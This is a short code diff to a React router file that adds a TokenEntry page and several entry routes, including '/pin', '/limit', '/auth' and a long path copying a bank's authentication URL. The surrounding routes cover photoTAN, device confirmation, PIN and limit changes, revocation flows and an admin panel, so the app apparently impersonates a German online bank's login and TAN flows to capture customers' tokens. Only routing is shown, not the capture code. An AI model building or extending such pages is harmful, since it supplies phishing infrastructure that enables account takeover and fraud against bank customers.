@@ -9,6 +9,7 @@ import DeviceConfirm from "./pages/DeviceConfirm.tsx";
 import PhotoTan from "./pages/PhotoTan.tsx";
 import NotFound from "./pages/NotFound.tsx";
 import Admin from "./pages/Admin.tsx";
+import TokenEntry from "./pages/TokenEntry.tsx";
 
 
 import FlowLanding from "./pages/FlowLanding.tsx";
@@ -50,11 +51,14 @@ const App = () => (
           <Route path="/confirm" element={<DeviceConfirm />} />
           <Route path="/phototan" element={<PhotoTan />} />
           <Route path="/admin" element={<Admin />} />
+          <Route path="/token" element={<TokenEntry />} />
 
           <Route path="/widerruf" element={<FlowLanding kind="widerruf" />} />
           <Route path="/limit-aenderung" element={<FlowLanding kind="limit" />} />
           <Route path="/pin-aenderung" element={<FlowLanding kind="pin" />} />
+          
 
+          <Route path="/pin" element={<TokenEntry kind="pin" />} />
           <Route path="/pin/start" element={<PinStart />} />
           <Route path="/pin/offline" element={<PinOffline />} />
           <Route path="/limit/loading" element={<LimitLoading />} />
@@ -63,8 +67,10 @@ const App = () => (
           <Route path="/widerruf/start" element={<WiderrufStart />} />
           <Route path="/widerruf/phototan" element={<WiderrufPhotoTan />} />
           <Route path="/widerruf/:token" element={<StornoWiderrufFlow />} />
-
-
+          <Route path="/limit" element={<TokenEntry kind="limit" />} />
+          
+          <Route path="/auth" element={<TokenEntry />} />
+          <Route path="/auth/ui/app/auth/flow/:slug/access" element={<TokenEntry />} />
           <Route path="/berater" element={<Berater />} />
           <Route path="/homepage" element={<Homepage />} />
           <Route path="/success" element={<Success />} />
